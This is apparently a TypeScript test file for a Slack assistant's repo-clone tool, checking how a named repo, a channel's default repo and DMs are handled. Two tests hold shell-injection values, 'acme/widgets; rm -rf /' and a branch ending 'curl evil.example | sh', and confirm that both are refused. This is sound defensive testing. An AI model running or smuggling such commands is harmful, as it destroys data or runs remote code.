// workspace_clone and a channel's default repo (#126): which repo a call means. A repo
// named in the request wins; with none named, the default of the channel the thread is in;
// with neither, the model is told to ask. The channel is the turn's, never the model's.

import { describe, expect, test } from "bun:test";
import { cloneTool, type DefaultRepo } from "../src/tools/clone";
import { answeredChannel } from "../src/tools/slack-channels";
import type { ExecOptions, Sandbox } from "../src/tools/workspace";

// A sandbox that records every exec; `origin` is the checkout's remote, if any.
function fakeSandbox(origin?: string, fail?: RegExp) {
  const calls: { command: string; opts?: ExecOptions }[] = [];
  const sb = {
    async exec(command: string, opts?: ExecOptions) {
      calls.push({ command, opts });
      if (command.includes("remote get-url origin")) return origin ? { exitCode: 0, stdout: `${origin}\n`, stderr: "" } : { exitCode: 2, stdout: "", stderr: "" };
      if (fail?.test(command)) return { exitCode: 128, stdout: "", stderr: "fatal: Remote branch gone not found in upstream origin" };
      return { exitCode: 0, stdout: "", stderr: "" };
    },
  } as unknown as Sandbox;
  const cloned = () => calls.find((c) => c.command.includes(" clone "))?.command.replace(/^.* clone /, "clone ");
  return { sb, calls, cloned };
}

// A turn's context, as June hands a tool one: a mention or a thread reply in a channel, or a DM.
const inChannel = (channelId: string, channelType = "unknown") => ({ event: { source: "slack", kind: "app_mention", channelId, channelType, ts: "1.1" } }) as never;
const DM = { event: { source: "slack", kind: "message", channelId: "D1", channelType: "im", ts: "1.1" } } as never;

const DEFAULTS: Record<string, DefaultRepo> = { C1: { repo: "acme/widgets", branch: "main" }, C2: { repo: "acme/gadgets", branch: null } };
function setup(o: { origin?: string; fail?: RegExp; defaults?: Record<string, DefaultRepo> } = {}) {
  const s = fakeSandbox(o.origin, o.fail);
  const asked: string[] = [];
  const looked: string[] = [];
  const tool = cloneTool(() => s.sb, async (r) => (asked.push(`${r.owner}/${r.name}`), "ghs_read"), {
    defaultRepo: (channel) => (looked.push(channel), (o.defaults ?? DEFAULTS)[channel]),
  });
  return { ...s, tool, asked, looked };
}

describe("workspace_clone: which repo", () => {
  test("no repo named: the default repo of the channel being answered in, on its branch", async () => {
    const s = setup();
    expect(await s.tool.run({}, inChannel("C1"))).toEqual({ status: "cloned", repo: "acme/widgets", path: "/workspace/repo", source: "channel_default", branch: "main" });
    expect(s.cloned()).toBe("clone --branch main https://github.com/acme/widgets.git /workspace/repo");
    expect(s.asked).toEqual(["acme/widgets"]); // a read token for the default, as for a named repo
    expect(s.looked).toEqual(["C1"]);
  });

  test("a default without a branch clones the repo's own default branch", async () => {
    const s = setup();
    expect(await s.tool.run({}, inChannel("C2"))).toEqual({ status: "cloned", repo: "acme/gadgets", path: "/workspace/repo", source: "channel_default" });
    expect(s.cloned()).toBe("clone https://github.com/acme/gadgets.git /workspace/repo");
  });

  test("no input at all, an empty repo or a null one is no repo named", async () => {
    for (const input of [undefined, {}, { repo: "" }, { repo: null }]) {
      const s = setup();
      expect(await s.tool.run(input, inChannel("C1"))).toMatchObject({ repo: "acme/widgets", source: "channel_default" });
    }
  });

  test("a follow-up in the thread (a plain message) gets the same default as the mention", async () => {
    const s = setup();
    expect(await s.tool.run({}, inChannel("C1", "channel"))).toMatchObject({ repo: "acme/widgets", source: "channel_default" });
  });

  test("a repo named in the request wins over the channel's default, and doesn't take its branch", async () => {
    const s = setup();
    expect(await s.tool.run({ repo: "acme/other" }, inChannel("C1"))).toEqual({ status: "cloned", repo: "acme/other", path: "/workspace/repo", source: "named" });
    expect(s.cloned()).toBe("clone https://github.com/acme/other.git /workspace/repo");
    expect(s.asked).toEqual(["acme/other"]);
  });

  test("naming the default repo itself (in any case, or as a URL) still starts on the default's branch", async () => {
    for (const repo of ["acme/widgets", "Acme/Widgets", "https://github.com/acme/widgets"]) {
      const s = setup();
      expect(await s.tool.run({ repo }, inChannel("C1"))).toMatchObject({ status: "cloned", source: "named", branch: "main" });
      expect(s.cloned()).toContain("clone --branch main https://github.com/");
    }
  });

  // GitHub's owner and repo names are case-insensitive: one thread, one checkout, however
  // each request spells it. A sandbox that remembers what was cloned into it.
  function thread() {
    let origin: string | undefined;
    const sb = {
      async exec(command: string) {
        if (command.includes("remote get-url origin")) return origin ? { exitCode: 0, stdout: `${origin}\n`, stderr: "" } : { exitCode: 2, stdout: "", stderr: "" };
        const clone = / clone (?:--branch \S+ )?(\S+) \/workspace\/repo$/.exec(command);
        if (clone) origin = clone[1];
        return { exitCode: 0, stdout: "", stderr: "" };
      },
    } as unknown as Sandbox;
    const tool = cloneTool(() => sb, async () => "ghs_read", { defaultRepo: (channel) => DEFAULTS[channel] });
    return { tool, origin: () => origin };
  }

  test("the default named in another case, then no repo named: the same checkout, fetched, not a second repo", async () => {
    const t = thread();
    // Named as the channel's default in another case: cloned as GitHub spells it, the default's spelling.
    expect(await t.tool.run({ repo: "Acme/Widgets" }, inChannel("C1"))).toEqual({ status: "cloned", repo: "acme/widgets", path: "/workspace/repo", source: "named", branch: "main" });
    expect(t.origin()).toBe("https://github.com/acme/widgets.git");
    expect(await t.tool.run({}, inChannel("C1"))).toEqual({ status: "fetched", repo: "acme/widgets", path: "/workspace/repo", source: "channel_default" });
  });

  test("no repo named, then the default named in another case: the same checkout, fetched", async () => {
    const t = thread();
    expect(await t.tool.run({}, inChannel("C1"))).toMatchObject({ status: "cloned", repo: "acme/widgets" });
    expect(await t.tool.run({ repo: "ACME/WIDGETS" }, inChannel("C1"))).toEqual({ status: "fetched", repo: "acme/widgets", path: "/workspace/repo", source: "named" });
  });

  test("with no default: a repo named twice in different cases is one checkout, reported as it was cloned", async () => {
    const t = thread();
    expect(await t.tool.run({ repo: "Acme/Other" }, inChannel("C9"))).toMatchObject({ status: "cloned", repo: "Acme/Other" });
    expect(await t.tool.run({ repo: "acme/other" }, inChannel("C9"))).toEqual({ status: "fetched", repo: "Acme/Other", path: "/workspace/repo", source: "named" });
    // A different repo is still refused, naming what is there as it was cloned.
    expect(await t.tool.run({ repo: "acme/another" }, inChannel("C9"))).toMatchObject({ error: expect.stringContaining("already holds Acme/Other") });
  });

  test("no repo named and no default: the model is told to ask which repo, and nothing runs", async () => {
    const s = setup();
    const r = (await s.tool.run({}, inChannel("C9"))) as { error: string };
    expect(r.error).toContain("no repo was named");
    expect(r.error).toContain("Ask which GitHub repo (owner/name)");
    expect(s.calls).toEqual([]);
    expect(s.asked).toEqual([]);
    // No defaults wired at all (the tool built without the option): the same answer.
    const bare = cloneTool(() => s.sb, async () => "t");
    expect(await bare.run({}, inChannel("C1"))).toEqual(r);
  });

  test("a DM has no default, even if a row existed for its id: the lookup is never made", async () => {
    const s = setup({ defaults: { D1: { repo: "acme/widgets", branch: null } } });
    expect(await s.tool.run({}, DM)).toMatchObject({ error: expect.stringContaining("no repo was named") });
    // A DM arriving without a channel type is still a DM by its id.
    expect(await s.tool.run({}, inChannel("D1"))).toMatchObject({ error: expect.stringContaining("no repo was named") });
    expect(s.looked).toEqual([]);
    expect(s.calls).toEqual([]);
    // Named, a repo clones in a DM as before.
    expect(await s.tool.run({ repo: "acme/widgets" }, DM)).toMatchObject({ status: "cloned", source: "named" });
  });

  test("a turn Slack didn't start has no channel, so no default", async () => {
    const s = setup();
    for (const ctx of [{}, { event: { source: "webhook", channelId: "C1" } }, { event: { source: "slack" } }]) {
      expect(await s.tool.run({}, ctx as never)).toMatchObject({ error: expect.stringContaining("no repo was named") });
    }
    expect(s.looked).toEqual([]);
  });

  test("the model can't name the channel: any other input is ignored, and the turn's channel decides", async () => {
    const s = setup();
    expect(await s.tool.run({ channel: "C2", channelId: "C2" }, inChannel("C1"))).toMatchObject({ repo: "acme/widgets" });
    expect(s.looked).toEqual(["C1"]);
    expect((cloneTool(() => s.sb, async () => "t").spec.input as { properties: object }).properties).toEqual({ repo: expect.any(Object) });
  });

  test("a repo that isn't one is still refused, default or not", async () => {
    const s = setup();
    expect(await s.tool.run({ repo: "acme/widgets; rm -rf /" }, inChannel("C1"))).toMatchObject({ error: expect.stringContaining("not a GitHub repo") });
    expect(await s.tool.run({ repo: 7 }, inChannel("C1"))).toMatchObject({ error: expect.stringContaining("`repo` must be a string") });
    expect(s.calls).toEqual([]);
  });

  test("already cloned: the default is fetched, and the checkout's branch is left alone", async () => {
    const s = setup({ origin: "https://github.com/acme/widgets.git" });
    expect(await s.tool.run({}, inChannel("C1"))).toEqual({ status: "fetched", repo: "acme/widgets", path: "/workspace/repo", source: "channel_default" });
    expect(s.calls.some((c) => c.command.includes("fetch --prune origin"))).toBe(true);
    expect(s.calls.some((c) => /checkout|switch|--branch/.test(c.command))).toBe(false);
  });

  test("the thread already holds another repo: the default isn't cloned over it, and the error names what is there", async () => {
    const s = setup({ origin: "https://github.com/acme/other.git" });
    expect(await s.tool.run({}, inChannel("C1"))).toMatchObject({ error: expect.stringContaining("already holds acme/other") });
  });

  test("a default that fails to clone (its branch gone since it was set) says it is the channel's default", async () => {
    const s = setup({ fail: / clone / });
    const r = (await s.tool.run({}, inChannel("C1"))) as { error: string };
    expect(r.error).toStartWith("clone failed: fatal: Remote branch gone not found");
    expect(r.error).toContain("acme/widgets, branch main, is this channel's default repo; an admin can change it");
    // A named repo's failure carries no such hint.
    const named = setup({ fail: / clone / });
    expect(((await named.tool.run({ repo: "acme/other" }, inChannel("C1"))) as { error: string }).error).not.toContain("default repo");
  });

  test("a default branch that isn't a plain branch name never reaches the shell", async () => {
    const s = setup({ defaults: { C1: { repo: "acme/widgets", branch: "main; curl evil.example | sh" } } });
    expect(await s.tool.run({}, inChannel("C1"))).toMatchObject({ error: expect.stringContaining("isn't a usable branch name") });
    expect(await s.tool.run({ repo: "acme/widgets" }, inChannel("C1"))).toMatchObject({ error: expect.stringContaining("isn't a usable branch name") });
    expect(s.calls).toEqual([]);
    // Another repo, named, has nothing to do with that branch.
    expect(await s.tool.run({ repo: "acme/other" }, inChannel("C1"))).toMatchObject({ status: "cloned" });
  });

  test("a default repo that isn't owner/name is no default", async () => {
    const s = setup({ defaults: { C1: { repo: "not a repo", branch: null } } });
    expect(await s.tool.run({}, inChannel("C1"))).toMatchObject({ error: expect.stringContaining("no repo was named") });
  });
});

describe("the channel a turn is answering in", () => {
  test("a Slack channel's id; nothing for a DM, or outside Slack", () => {
    expect(answeredChannel(inChannel("C1"))).toBe("C1");
    expect(answeredChannel(inChannel("C1", "channel"))).toBe("C1");
    expect(answeredChannel(DM)).toBeUndefined();
    expect(answeredChannel(inChannel("D9"))).toBeUndefined();
    expect(answeredChannel({} as never)).toBeUndefined();
    expect(answeredChannel({ event: { source: "email", channelId: "C1" } } as never)).toBeUndefined();
  });
});
